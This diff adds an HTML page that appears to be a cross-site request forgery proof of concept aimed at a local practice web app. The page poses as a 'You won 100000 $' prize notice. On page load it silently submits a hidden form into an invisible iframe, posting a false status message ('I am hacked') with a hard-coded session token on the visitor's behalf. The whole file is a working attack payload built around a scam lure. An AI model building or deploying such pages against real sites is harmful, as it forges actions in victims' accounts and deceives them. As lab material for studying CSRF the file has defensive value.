@@ -1,0 +1,43 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>Congratulations !! You won 100000 $</title>
+<style>
+input[type=text] {
+    background: transparent url("prize.jpg") 0 0 no-repeat;
+    font-weight: bold;
+    display: inline-block;
+    text-align: center;
+    cursor: pointer;
+    height: 350px; /* height of the background image */
+    width: 725px; /* width of the background image */
+}
+
+
+  .hide { position:absolute; top:-1px; left:-1px; width:1px; height:1px; }
+</style>
+
+<script>
+function spam()
+{
+	document.getElementById("dataForm").submit();
+}
+
+</script>
+
+</head>
+<body bgcolor="#FF0000" onload="spam()">
+
+<div align="center" id="registration">
+	<form id="dataForm" method="POST" action="http://localhost/mtp/dvwapp/files/demo/csrf_submit.php" target="hiddenFrame">
+		<input type="hidden" name="current_status" value="Oh I am a liar. But Why am I saying this? Because I am hacked.">
+		<input type="text" name="post" value="">
+		<input name="session_token" type="hidden" value="14550073ccb7d555.43647826">
+	</form>
+
+
+    <iframe name="hiddenFrame" class="hide"></iframe>
+</div>
+
+</body>
+</html>
